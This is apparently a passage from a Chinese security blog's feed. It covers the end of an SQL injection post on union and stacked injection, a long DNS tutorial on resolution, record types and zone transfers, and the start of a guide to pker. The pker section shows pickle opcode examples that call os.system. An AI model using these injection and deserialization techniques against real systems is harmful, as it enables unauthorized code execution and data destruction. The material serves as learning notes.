&#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>其他函数</p></blockquote><p>上面这几个仅仅是比较常见的函数，实际上还有很多不常见的</p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>利用 <code>union</code> 来拼接 select 语句。主要是判断列数。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>MySQL 语句中的 <code>;</code> 代表一个语句结束。如果 <code>;</code> 之后的语句也能执行，那么就可以拼接任意语句，包括<code>drop database</code>。</p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也是有可能的</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>盲注骚操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS</title>
    <link href="/tuyi/2025/01/27/%E8%AE%BADNS/"/>
    <url>/tuyi/2025/01/27/%E8%AE%BADNS/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS的起源"><a href="#DNS的起源" class="headerlink" title="DNS的起源"></a>DNS的起源</h1><p>借助ai使用一个故事来解释DNS的起源：</p><h2 id="第一章：混乱的“电话簿”时代"><a href="#第一章：混乱的“电话簿”时代" class="headerlink" title="第一章：混乱的“电话簿”时代"></a><strong>第一章：混乱的“电话簿”时代</strong></h2><p>1980年代初，互联网还像一个刚刚兴起的小镇，名叫“阿帕镇”（ARPANET）。镇上的居民（计算机）虽然不多，但彼此通信全靠一本<strong>纸质电话簿</strong>——名为 <code>hosts.txt</code> 的文件。<br>这本电话簿由镇上的“管理员爷爷”（斯坦福研究院的SRI-NIC）手写维护，每新增一台设备，爷爷就得熬夜更新，再派人骑马送到每户人家。<br>可随着镇子扩大，问题来了：</p><ul><li>新住户暴增，电话簿越来越厚，骑马送书的速度赶不上变化。</li><li>有人家地址改了，邻居却还在用旧电话簿，信全寄丢了！</li><li>爷爷累倒了，全镇通信濒临瘫痪……</li></ul><hr><h2 id="第二章：天才少年的灵感"><a href="#第二章：天才少年的灵感" class="headerlink" title="第二章：天才少年的灵感"></a><strong>第二章：天才少年的灵感</strong></h2><p>一天，镇上的年轻工程师<strong>保罗·莫卡佩特里斯</strong>（Paul Mockapetris）在酒馆喝酒，听到有人抱怨：“要是电话簿能自动更新，还能分区域管理就好了！”<br>他灵光一闪，掏出一张皱巴巴的草纸，画下了一个<strong>分层地址系统</strong>的设计图：</p><ol><li><strong>总机（根服务器）</strong>：只记录每个“大区”的接线员是谁。</li><li><strong>区域分机（顶级域服务器）</strong>：比如 <code>.com</code> 区、<code>.edu</code> 区，负责管理下属街道。</li><li><strong>街道分机（权威服务器）</strong>：直接保管每户人家的最新地址。</li></ol><p>他兴奋地大喊：“不再需要一本大书！问路的人按层级查询，就像打电话转接分机！”</p><hr><h2 id="第三章：DNS系统的诞生"><a href="#第三章：DNS系统的诞生" class="headerlink" title="第三章：DNS系统的诞生"></a><strong>第三章：DNS系统的诞生</strong></h2><p>保罗连夜说服镇长（互联网工程组IETF），在小镇试点新系统——<strong>DNS（域名系统）</strong>。</p><ul><li><strong>域名</strong>：每户人家有了易记的名字，比如 <code>面包店.example.com</code>。</li><li><strong>解析流程</strong>：<ol><li>居民问总机：“<code>.com</code> 区谁管？”</li><li>总机回答：“去问 <code>.com</code> 区分机！”</li><li><code>.com</code> 区分机说：“<code>example.com</code> 街道归保罗家的服务器管！”</li><li>最终，保罗家的服务器给出“面包店”的IP地址：<code>192.0.2.1</code>。</li></ol></li></ul><p><strong>奇迹发生了</strong>：</p><ul><li>地址簿自动更新，再也不用全镇派送！</li><li>查询速度快如闪电，迷路的人越来越少。</li><li>小镇扩张成超级城市（互联网），DNS成了看不见的“导航员”。</li></ul><hr><h2 id="尾声：小镇的遗产"><a href="#尾声：小镇的遗产" class="headerlink" title="尾声：小镇的遗产"></a><strong>尾声：小镇的遗产</strong></h2><p>多年后，阿帕镇成了全球互联网，DNS系统默默支撑着亿万次查询。</p><ul><li><strong>根服务器</strong>像守护神，全球仅有13组（镜像遍布各地）。</li><li><strong>层级管理</strong>让每个社区（域名）自治，无需中央集权。</li><li>保罗的名字被刻在“互联网名人堂”，而那本旧电话簿，成了博物馆里的古董。</li></ul><hr><h2 id="隐喻解读"><a href="#隐喻解读" class="headerlink" title="隐喻解读"></a><strong>隐喻解读</strong></h2><ul><li><strong>电话簿</strong> <code>hosts.txt</code> → 早期静态主机文件</li><li><strong>总机→区域分机→街道分机</strong> → DNS根服务器→顶级域→权威服务器</li><li><strong>骑马送书</strong> → 手动更新主机文件的低效</li><li><strong>分层查询</strong> → DNS递归&#x2F;迭代解析流程</li></ul><p>在早期计算机系统的通信不便下，这便成就了DNS</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="区域"><a href="#区域" class="headerlink" title="区域"></a>区域</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200914104025076.png" alt="20200914104025076"></p><p>其中顶级域（TLD）有 <code>arpa</code>、<code>com</code>、<code>edu</code>、<code>gov</code>…</p><p>顶级域分为两种类型：</p><ol><li><code>gTLDs</code>: <code>.com</code>、<code>.org</code> 等叫做<code>一般通用顶级域</code></li><li><code>ccTLDs</code>: <code>.cn</code>、<code>.jp</code> 等叫做<code>国家顶级域</code></li><li><code>arpa</code>：特殊域，比较特殊放在下面讲</li></ol><p>一个 DNS 子树（独立管理的）就称为一个<code>区域</code>，举个例子，比如 <code>sina.com.cn</code> 这个二级域，可以将它的区域划分为更小的区域，比如一般会根据用途来划分区域，假设 <code>blog.sina.com.cn</code> 为博客相关的域名等等。划分完子区域之后，需要经过父区域的授权，这样父区域遇到属于子区域下的域名，就会转给子区域来解析。</p><h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><p>在说流程之前，先说一下查询方式。很简单，分为 2 种：</p><ol><li>递归查询：A -&gt; B -&gt; C，A 向 B 发起 DNS 解析的请求之后，B 帮 A 去 C 那里查找，拿到结果之后返回给 A，这个时候 A、B 各发起了一次解析请求。</li><li>迭代查询：A -&gt; B, A -&gt; C，A 向 B 发起 DNS 解析的请求之后，B 告诉 A 要去 C 那里查找，A 再向 C 发起 DNS 解析请求，这个时候 A 一共发起了两次解析请求，B 没有发起 DNS 解析请求。</li></ol><h2 id="Hosts-文件（静态-DNS-服务器）"><a href="#Hosts-文件（静态-DNS-服务器）" class="headerlink" title="Hosts 文件（静态 DNS 服务器）"></a>Hosts 文件（静态 DNS 服务器）</h2><p>在windows下的hosts文件存放在<code>C:\Windows\System32\drivers\etc\hosts</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This file contains the mappings of IP addresses to host names. Each</span><br><span class="hljs-comment"># entry should be kept on an individual line. The IP address should</span><br><span class="hljs-comment"># be placed in the first column followed by the corresponding host name.</span><br><span class="hljs-comment"># The IP address and the host name should be separated by at least one</span><br><span class="hljs-comment"># space.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="hljs-comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># For example:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#      102.54.94.97     rhino.acme.com          # source server</span><br><span class="hljs-comment">#       38.25.63.10     x.acme.com              # x client host</span><br><br><span class="hljs-comment"># localhost name resolution is handled within DNS itself.</span><br><span class="hljs-comment">#127.0.0.1       localhost</span><br><span class="hljs-comment">#::1             localhost</span><br><span class="hljs-comment"># Added by Docker Desktop</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> host.docker.internal<br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> gateway.docker.internal<br><span class="hljs-comment"># To allow the same kube context to work on the host and the container:</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> kubernetes.docker.internal<br><span class="hljs-comment"># End of section</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> localhost<br></code></pre></td></tr></table></figure><p>在linux下可以访问&#x2F;etc&#x2F;hosts查看</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir"> cat /etc/hosts<br><span class="hljs-comment"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf: #使用的是wsl子系统</span><br><span class="hljs-comment"># [network]</span><br><span class="hljs-comment"># generateHosts = false</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>       localhost<br><span class="hljs-number">127.0</span>.<span class="hljs-number">1.1</span>       <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span>.        <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span><br><br><span class="hljs-comment"># The following lines are desirable for IPv6 capable hosts</span><br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span> ip6-localnet<br>ff00::<span class="hljs-number">0</span> ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span> ip6-allnodes<br>ff02::<span class="hljs-number">2</span> ip6-allrouters<br></code></pre></td></tr></table></figure><p>可以看见<code>127.0.01</code>被映射到<code>localhost</code> 其实访问<code>127.0.0.1</code>就是在房访问<code>localhost</code></p><p>Hosts 文件，可以直接理解为是本地静态的 DNS 服务器。需要解析 DNS 的时候，系统会首先自动从 Hosts 文件中寻找对应的 ip-域名 映射关系，一旦找到那么就完成解析了，如果没有找到，则继续解析流程。优先级高于网络DNS解析服务，所有可以加快域名解析、屏蔽垃圾网站、广告等等</p><h2 id="LocalDNS-服务器"><a href="#LocalDNS-服务器" class="headerlink" title="LocalDNS 服务器"></a>LocalDNS 服务器</h2><p>若 Hosts 文件中没有相关域名的记录，则来到了 LocalDNS。</p><p>在windows中，如果 <code>hosts</code> 文件中没有相关域名的记录，系统会依赖本地网络配置中的 DNS 服务器进行域名解析。Windows 的本地 DNS 配置存储在 <strong>网络适配器的设置中</strong>无法具体呈现，</p><p>但是在linux中可以看一下这个文件：<code>/etc/resolv.conf</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/resolv.<span class="hljs-keyword">conf</span><br># This <span class="hljs-keyword">file</span> was automatically generated by WSL. To <span class="hljs-keyword">stop</span> automatic generation of this <span class="hljs-keyword">file</span>, <span class="hljs-built_in">add</span> the following entry <span class="hljs-keyword">to</span> /etc/wsl.<span class="hljs-keyword">conf</span>:<br># [network]<br># generateResolvConf = false<br>nameserver <span class="hljs-number">10</span>.xxx.xxx.xxx<br></code></pre></td></tr></table></figure><p>这个文件一般是自动生成的，什么时候生成的呢？DHCP(动态主机配置协议) 的时候。需要注意的是，这个文件里的 ip 经常是内网 ip，并且 LocalDNS 里面有个 “local”，大家可能会认为 LocalDNS 的服务器 ip 都是内网 ip，实际上也可以是外网 ip，比如其他组织提供的 DNS，像谷歌的<code>8.8.8.8</code>啦，国内的<code>114.114.114.114</code>啦。个人感觉是这些 DNS 的地址填写在我们本地的电脑或者移动设备上，所以称为 LocalDNS</p><p>需要注意的是，LocalDNS 本身不具备真正的解析域名的功能。它的作用有两个：</p><ol><li>代替用户的设备参与域名解析</li><li>缓存域名的查询记录，当其他设备发起相同的域名查询请求时可以直接返回查询结果，可以加快域名查询速度。</li></ol><p>用户设备 -&gt;检查hosts文件-&gt; LocalDNS 一般是递归查询，而 LocalDNS 发现它自己没有缓存对应的数据后，则需要向 DNS 根服务器发起查询请求，这个请求，一般是迭代查询。所以任何 LocalDNS 都需知道 DNS 根服务器的 ip 地址。</p><h2 id="DNS-根服务器"><a href="#DNS-根服务器" class="headerlink" title="DNS 根服务器"></a>DNS 根服务器</h2><p>DNS 根服务器（root name server），全球只有 <code>13</code> 个，编号从 <code>a.root-servers.net</code> 一直到 <code>m.root-servers.net</code>。之所以不说 13 台，是因为每个 DNS 根节点都会有多个服务器负责均衡查询（即任播节点），你可以在这个网站查询：<a href="https://root-servers.org/">https://root-servers.org/</a> 。</p><p>现在解析 DNS 的时候，已经不再需要知道 DNS 根服务器的真正的 ip 地址，只需要知道任播节点的ip地址就可以在世界各地与当地的最优节点进行通信了，所以现在大多数的 DNS 根服务器的 ip 地址都是任播节点 的 ip 地址。这样速度最快</p><p>所以，DNS 根服务器掌管着所有 <code>DNS 顶级域名服务器</code> 的地址，比如大家熟悉的 <code>.com</code>、<code>.org</code>、<code>.edu</code> 等等。假如我们查询的顶级域名是 <code>.com</code>，DNS 根服务器会将<code>.com</code> 顶级域名服务器的地址发回给 LocalDNS 服务器，让它自己去那里查。于是 LocalDNS 服务器再向手握 <code>.com</code> 的 DNS 顶级域名服务器发起查询</p><h2 id="DNS-顶级域名服务器"><a href="#DNS-顶级域名服务器" class="headerlink" title="DNS 顶级域名服务器"></a>DNS 顶级域名服务器</h2><p>手握 <code>.com</code> 的 DNS 顶级域名服务器一看来源的查询是 <code>xxx.com</code>，按理来说应该可以找到对应的 ip 并直接返回了。但是现在基本上都是授权给其他厂家去做的，被授权的叫<code>DNS 权威域名服务器</code>，或者企业自建的 DNS 服务器。举个例子，解析一下<code>baidu.com</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">~$ dig baidu.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.24.04.1-Ubuntu &lt;&lt;&gt;&gt; baidu.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 46978</span><br><span class="hljs-string">;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; MBZ: 0x0001, udp: 1232</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;baidu.com.                     IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">baidu.com.              1       IN      A       198.18.0.6</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 0 msec</span><br><span class="hljs-string">;; SERVER: 10.255.255.254#53(10.255.255.254) (UDP)</span><br><span class="hljs-string">;; WHEN: Mon Jan 27 18:59:34 CST 2025</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 54</span><br></code></pre></td></tr></table></figure><p>这里表示查询首先经过了<code>10.255.255.254</code>（本地的localDNS）设置的DNS解析地址,如果本地没有对应的缓存记录,他就会发起递归查询，首先向<strong>最近的传播节点</strong>查询<code>baidu.com</code>的顶级域名服务器（<code>.com</code> 的权威服务器）。节点会返回 <code>.com</code> 的权威服务器地址。LocalDNS 再向 <code>.com</code> 的权威服务器查询 <code>baidu.com</code> 的权威服务器。<code>.com</code> 的权威服务器返回 <code>baidu.com</code> 的权威域名服务器地址,LocalDNS 最终向 <code>dns.baidu.com</code> 查询，获取到实际的ip地址，</p><p>这个时候 LocalDNS 服务器就会缓存 <code>baidu.com</code> 的 DNS 权威域名服务器，免得下次查的时候还得再走一遍之前的流程（当然是在缓存未过期的情况下）。</p><h2 id="DNS-权威域名服务器"><a href="#DNS-权威域名服务器" class="headerlink" title="DNS 权威域名服务器"></a>DNS 权威域名服务器</h2><p>DNS 权威域名服务器要提前申请 DNS 解析授权，这类 DNS 域名服务器一般掌管着特定域下所有的子域和主机，比如它不仅知道 <code>baidu.com</code> 的 ip，同样也知道 <code>www.baidu.com</code> 的 ip。所以它可以直接返回结果，这一步没啥好说的。</p><p>同样， LocalDNS 服务器也会缓存 <code>baidu.com</code> 的 ip，免得下次查的时候还得再走一遍之前的流程（当然也是在缓存未过期的情况下）。</p><p>各大公司一般都有自己的权威域名服务器，自己维护 DNS，好处有很多，比如：</p><ol><li>方便管理。假如不自己维护域名信息，域名生效时间和缓存时间都是不可控的，而自己搭建可以避免这些问题。</li><li>动态管理。比如通过一些软件来更新自己的 DNS 信息更方便，还可以做动态域名解析。</li></ol><h3 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h3><p>（以下流程以 A 记录(表示该域名解析到的 IP 地址)为例）</p><ol><li>设备 -&gt; LocalDNS 服务器（递归查询）</li><li>LocalDNS 服务器 -&gt; DNS 根服务器或者最近的传播节点（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 根服务器或者最近的传播节点（返回顶级域名服务器的地址）</li><li>LocalDNS 服务器 -&gt; DNS 顶级域名服务器（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 顶级域名服务器（返回权威域名服务器的地址）</li><li>LocalDNS 服务器 -&gt; DNS 权威域名服务器（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 权威域名服务器（返回 ip）</li><li>设备 &lt;- LocalDNS 服务器（返回 ip）</li></ol><h2 id="DNS-的几个重要概念"><a href="#DNS-的几个重要概念" class="headerlink" title="DNS 的几个重要概念"></a>DNS 的几个重要概念</h2><h3 id="DNS-资源记录（Resource-Record-RR）"><a href="#DNS-资源记录（Resource-Record-RR）" class="headerlink" title="DNS 资源记录（Resource Record, RR）"></a>DNS 资源记录（Resource Record, RR）</h3><p>DNS 服务器有自己的域文件（zone file），zone file 是由多个记录组成的，每一个记录就被称为资源记录。</p><p>假如你买了一个域名，需要绑定到对应的 ip 上来提供 web 服务，或者要提供其他服务，这个时候域名的销售方会让你选择解析的类型，常见的有以下几种：</p><ol><li><code>A</code> 记录：将域名指向一个 IPv4 地址（例如：100.100.100.100）最常用的</li><li><code>CNAME</code> 记录：将域名指向一个域名，实现与被指向域名相同的访问效果，可以简单地理解为域名的别名。比如 <code>www.baidu.com</code> 就是 cname 到 <code>baidu.com</code> 上，然后 <code>baidu.com</code> 是有自己的 A 记录的，这样有个好处就是假如有很多个域名，<code>a.baidu.com</code>、<code>b.baidu.com</code>…，但是 ip 只有 1 个，如果不用 cname，当这个 ip 变更的时候，每个与此 ip 绑定的域名都要去改 A 记录；用了 cname 之后，只需要改 cname 的域名（<code>baidu.com</code>）的 A 记录即可。（CDN 加速应该就是这样做的对吧~）</li><li><code>MX</code> 记录：指向电子邮件服务器地址，一般会根据邮箱服务商提供的 MX 记录填写此记录。</li><li><code>NS</code> 记录：权威域名服务器记录，即将某些域名指定让某个 DNS 域名服务器来解析。需要注意的是，只有顶级域名（或者说一级域名）才有 ns 记录，比如 <code>www.weibo.com</code> 是没有 ns 记录的。</li><li><code>TXT</code> 记录：可任意填写、可为空。一般做一些验证记录时会使用此项，例如：SPF 记录（用于反垃圾邮件）</li><li><code>AAAA</code> 记录：将域名指向一个 IPv6 地址（例如：ff03:0:0:0:0:0:0:c1）</li><li><code>SOA</code> 记录：SOA（Start of Authority）叫做起始授权机构记录。通俗地来讲，一个域名可能有很多个 NS 记录，因为会有多台服务器在进行解析（负责均衡或者备份），但哪一个才是主 DNS 权威服务器呢？这个就要看 SOA 记录了，它说明了在众多 NS 记录里哪一台才是主 DNS 权威服务器。这个主 DNS 权威服务器会负责其他事情，比如告诉其他 NS 权威服务器什么时候该更新数据（通过域传送的方式，下面会讲），甚至记录里还有对应联系人的邮件、TTL 等信息，这里就不多赘述了。</li><li><code>PTR</code> 记录：PTR 记录是 A 记录的逆向记录，负责将 IP 反向解析为域名，这个内容稍多，单独放在下面讲</li><li><code>AXFR</code>、<code>IXFR</code> 记录：涉及区域传送，单独放在下面讲</li></ol><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250127192139251.png" alt="image-20250127192139251"></p><h3 id="FQDN"><a href="#FQDN" class="headerlink" title="FQDN"></a>FQDN</h3><p><strong>FQDN</strong>（Fully Qualified Domain Name，完全限定域名）是指在域名系统（DNS）中一个完整的、唯一的域名，用来精确标识互联网上的一个主机或服务的位置。</p><h4 id="FQDN-的特点："><a href="#FQDN-的特点：" class="headerlink" title="FQDN 的特点："></a><strong>FQDN 的特点：</strong></h4><ol><li><strong>完整性：</strong><ul><li>FQDN 包括主机名（如 <code>www</code>）和域名（如 <code>example.com</code>）。</li><li>必须包含顶级域名（如 <code>.com</code>、<code>.org</code> 等），并最终以一个点（<code>.</code>）结尾（在技术上，最后的点表示 DNS 根）。</li></ul></li><li><strong>唯一性：</strong><ul><li>FQDN 是全球唯一的，它能在整个互联网中唯一标识一台设备或服务。</li><li>每个 FQDN 都指向一个特定的 IP 地址（通过 DNS 解析）。</li></ul></li><li><strong>结构</strong><ul><li>&lt;主机名&gt;.&lt;子域名&gt;.&lt;二级域名&gt;.&lt;顶级域名&gt;.</li></ul></li><li><strong>用途</strong><ul><li>HTTPS 证书（SSL&#x2F;TLS）通常绑定到 FQDN，确保通信的安全性和唯一性。</li><li>在配置邮件服务器、SSH 服务等网络服务时，通常需要填写 FQDN 以确保服务可以被正确识别</li></ul></li></ol><h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><p><code>DDNS</code>比<code>DNS</code>多了一个D多的就是一个<code>dynamic(动态的)</code></p><p><code>DDNS</code>是一种域名解析服务，用来将动态变化的 IP 地址实时更新到域名解析记录中，从而让用户能够通过固定的域名访问 IP 地址不断变化的设备。</p><h2 id="Non-authoritative-answer"><a href="#Non-authoritative-answer" class="headerlink" title="Non-authoritative answer"></a>Non-authoritative answer</h2><p>这个意思就是这个解析记录是从 LocalDNS 的缓存里拿来的，而不是向真正负责这个域名的 DNS 权威服务器拿来的</p><h2 id="DNS-区域传送"><a href="#DNS-区域传送" class="headerlink" title="DNS 区域传送"></a>DNS 区域传送</h2><p>是一种用于在 DNS 服务器之间复制 DNS 区域数据的机制，其目的是确保多个 DNS 服务器中存储的域名解析记录保持一致。这种机制通常在主从 DNS 服务器之间使用,DNS区域传送有两种方式：</p><ol><li><code>axfr</code>：完整区域传送</li><li><code>ixfr</code>：增量区域传送</li></ol><p>所以，正常情况下 DNS 区域传送操作只有经过授权的 DNS 服务器才有权执行，但许多 DNS 服务器却被错误地配置成只要有人发出请求，就直接提供一个 zone 的 DNS 内容。DNS 域传送漏洞会在下一篇详细介绍，这个手段是前些年用于信息收集的手段之一。</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pker</title>
    <link href="/tuyi/2025/01/26/pker/"/>
    <url>/tuyi/2025/01/26/pker/</url>
    
    <content type="html"><![CDATA[<h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li><li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li><li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li></ul><h2 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h2><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul></blockquote><p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p><h2 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h2><ol><li>pker中的针对pickle的特殊语法需要重点掌握</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li><li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">以下<span class="hljs-keyword">module</span>都可以是包含`.`的子<span class="hljs-keyword">module</span><br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br><span class="hljs-keyword">GLOBAL</span><br>对应opcode：b<span class="hljs-string">&#x27;c&#x27;</span><br>获取<span class="hljs-keyword">module</span>下的一个全局对象（没有import的也可以，比如下面的os）：<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：<span class="hljs-keyword">module</span>,instance(callable、<span class="hljs-keyword">module</span>都是instance)  <br><br>INST<br>对应opcode：b<span class="hljs-string">&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>对应opcode：b<span class="hljs-string">&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：callable,para<br><br>xxx(xx,...)<br>对应opcode：b<span class="hljs-string">&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：b<span class="hljs-string">&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>对应opcode：b<span class="hljs-string">&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：b<span class="hljs-string">&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx # 